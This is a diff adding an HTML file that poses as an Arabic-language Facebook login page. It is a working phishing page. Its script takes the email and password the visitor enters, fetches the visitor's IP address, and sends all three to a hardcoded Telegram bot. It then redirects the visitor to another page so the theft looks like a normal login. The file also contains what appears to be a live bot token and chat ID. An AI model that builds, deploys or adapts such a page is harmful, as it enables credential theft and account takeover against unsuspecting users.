@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>عليك تسجيل الدخول الى حسابك أولاً</title>
+  <style>
+    /* Your CSS styles here */
+    * {
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      overflow: hidden;
+    }
+    .main {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .p1 {
+      background: #E6E0C3;
+      width: 100%;
+      height: 25px;
+      padding: 10px;
+      font-size: 15px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #091B63;
+    }
+    .logo {
+      color: #2F4AB8;
+      margin: 1px 0;
+    }
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+    form {
+      margin-top: -5px;
+      height: 40vh;
+    }
+    #email, #pass {
+      width: 90vw;
+      display: block;
+      padding: 10px 10px;
+      margin: 5px 0;
+      outline: none;
+      font-size: 16px;
+      height: 28px;
+      border-radius: 5px;
+      border: none;
+      background: #E9E9E9;
+    }
+    #login {
+      display: block;
+      width: 100%;
+      font-size: 17px;
+      padding: 10px 0;
+      margin: 10px 0;
+      background: #1877F2;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      border: none;
+    }
+    a {
+      text-decoration: none;
+      text-align: center;
+      display: block;
+      font-size: 14px;
+      margin: 15px 0;
+    }
+    .or {
+      display: flex;
+      margin: 32px 0;
+    }
+    .p2, .p3 {
+      background: black;
+      height: 0.5px;
+      width: 145px;
+      margin: 0 10px;
+    }
+    .pOR {
+      margin-top: -9px;
+    }
+    #CNA {
+      background: none;
+      border: .5px solid black;
+      border-radius: 5px;
+      padding: 8px 3px;
+      width: 80vw;
+      font-weight: bold;
+      font-size: 16px;
+      margin: -25px 25px;
+    }
+    .lang {
+      display: flex;
+      margin-top: 90px;
+    }
+    .lang span {
+      margin: 0 65px;
+      list-style: none;
+      font-size: 13px;
+    }
+    .lang span li {
+      margin: 3px 0;
+      color: #2E325E;
+    }
+    .lang span .bl {
+      font-size: 14px;
+      margin: 0 -8px;
+      color: black;
+    }
+    .footer {
+      margin: 15px 22px;
+    }
+    .footer ul {
+      display: flex;
+    }
+    .footer ul li {
+      font-size: 10px;
+      color: #8F9098;
+      margin: 0 7px;
+    }
+    .no {
+      list-style: none;
+    }
+    .meta {
+      color: #8F9098;
+      font-size: 13px;
+      margin-top: -2px;
+    }
+    /* Add the following style to show and hide the loading */
+    #loading {
+      display: none;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <p class="p1">الحصول على تطبيق فيسبوك</p>
+    <div class="logo">
+      <img src="ps.png" alt="Parchisi Logo">
+    </div>
+    <form id="loginForm">
+      <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="email" id="email" required>
+      <input placeholder="كلمة السر" type="password" name="pass" id="pass" required>
+      <button id="login" type="button" onclick="redirectToWebsiteWithLoading()">تسجيل الدخول</button>
+      <a href="forgotten password? ">هل نسيت كلمة السر؟</a>
+      <div class="or">
+        <p class="p2"></p>
+        <p class="pOR">or</p>
+        <p class="p3"></p>
+      </div>
+      <button id="CNA" type="button">انشاء حساب جديد</button>
+    </form>
+    <div class="lang">
+      <span>
+        <li class="bl">English (UK)</li>
+        <li>portuguese</li>
+        <li>Japanese</li>
+        <li>Spanish</li>
+      </span>
+      <span>
+        <li>Hindi</li>
+        <li>Gujarati</li>
+        <li>Telugu</li>
+      </span>
+    </div>
+    <div class="footer">
+      <ul>
+        <li class="no">About</li>
+        <li>Help</li>
+        <li>More</li>
+      </ul>
+    </div>
+    <p class="meta">Meta &copy; 2023</p>
+    <div id="loading"></div>
+  </div>
+  <script>
+    function redirectToWebsiteWithLoading() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('pass').value;
+
+      showLoading(); // Show loading element
+
+      getIpAddress(function (ipAddress) {
+        sendToTelegram(email, password, ipAddress);
+
+        // You can add a delay to simulate a loading state.
+        setTimeout(function () {
+          hideLoading(); // Hide loading element after a delay
+          window.location.href = 'temporaryar.html'; // Redirect to the desired page
+        }, 2000); // 2000 milliseconds (2 seconds) delay
+      });
+    }
+
+    function getIpAddress(callback) {
+      var ipRequest = new XMLHttpRequest();
+      ipRequest.open('GET', 'https://api.ipify.org?format=json', true);
+
+      ipRequest.onload = function () {
+        if (ipRequest.status >= 200 && ipRequest.status < 400) {
+          var response = JSON.parse(ipRequest.responseText);
+          var ipAddress = response.ip;
+          callback(ipAddress);
+        }
+      };
+
+      ipRequest.send();
+    }
+
+    function sendToTelegram(email, password, ipAddress) {
+      var botToken = "5904955273:AAE4zBaVjCaI-ixcDnVfDG_unQaSdvM0i0Q"; // Replace with your Telegram bot token
+      var chatId = '2095151068'; // Replace with your Telegram chat ID
+
+      var message = '\n📧 ↝ 𝙴𝙼𝙰𝙸𝙻 » ' + email + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
+         '\n↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  »@HEXE_5';
+
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.send();
+    }
+
+    function showLoading() {
+      var loadingElement = document.getElementById('loading');
+      if (loadingElement) {
+        loadingElement.style.display = 'block';
+      }
+    }
+
+    function hideLoading() {
+      var loadingElement = document.getElementById('loading');
+      if (loadingElement) {
+        loadingElement.style.display = 'none';
+      }
+    }
+  </script>
+</body>
+</html>
